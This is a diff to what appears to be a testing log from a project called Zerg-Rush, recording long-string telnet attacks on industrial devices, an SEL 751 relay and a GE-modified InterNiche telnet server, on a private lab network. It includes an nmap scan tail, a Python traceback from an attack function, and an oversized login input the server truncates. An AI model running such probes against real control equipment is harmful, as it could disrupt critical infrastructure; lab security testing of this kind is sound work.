@@ -372,3 +372,36 @@ msf6 auxiliary(scanner/portscan/tcp) > db_nmap -sV -A -p 23 192.168.1.11
 [*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 39.14 seconds
 ```
+
+long string attack on SEL 751 - telnet
+
+``` command
+Traceback (most recent call last):
+  File "/home/wonjongbot/Zerg-Rush/main.py", line 72, in <module>
+    selection(src, dst, dport)
+  File "/home/wonjongbot/Zerg-Rush/main.py", line 56, in selection
+    menulogic(src, dst, dport)
+  File "/home/wonjongbot/Zerg-Rush/main.py", line 42, in menulogic
+    telnet_long(src, dst, dport)
+  File "/home/wonjongbot/Zerg-Rush/attacks.py", line 322, in telnet_long
+    tn.read_until(b"*")
+  File "/usr/lib/python3.10/telnetlib.py", line 329, in read_until
+    return self.read_very_lazy()
+  File "/usr/lib/python3.10/telnetlib.py", line 405, in read_very_lazy
+    raise EOFError('telnet connection closed')
+EOFError: telnet connection closed
+```
+
+long string attack on electroblox - telnet
+
+```command
+wonjongbot@computadora:~/Zerg-Rush$ telnet 192.168.1.11
+Trying 192.168.1.11...
+Connected to 192.168.1.11.
+Escape character is '^]'.
+Welcome to InterNiche Telnet Server 1.0 (Modified by GE)
+
+
+login:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXCmd too big (502 bytes), truncating 
+                                                                                                                                                                          password:Cmd too big (502 bytes), truncating 
+```
